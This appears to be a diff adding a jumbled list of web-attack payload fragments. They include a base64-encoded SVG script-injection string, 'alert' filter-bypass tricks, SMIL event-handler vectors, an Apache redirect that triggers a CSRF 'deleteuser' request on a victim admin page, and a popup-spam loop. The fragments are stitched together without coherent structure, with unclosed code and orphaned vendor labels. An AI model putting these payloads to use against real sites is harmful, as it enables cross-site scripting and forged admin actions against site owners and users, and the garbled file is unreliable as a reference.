@@ -1,0 +1,21 @@
+#Yandex:
+[B]
+#Others:
+-->
+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D"/>
+Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
+  id    ID    #REQUIRED>]>
+function makePopups(){
+[C]
+XXX
+a=alert,a(1)
+onbegin
+        window.open('popup.html','spam'+i,'width=50,height=50');
+[D]
+Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
+&lt
+#AlibabaGroup:
+Same effect with
+onStart
+onProgress
+onBegin
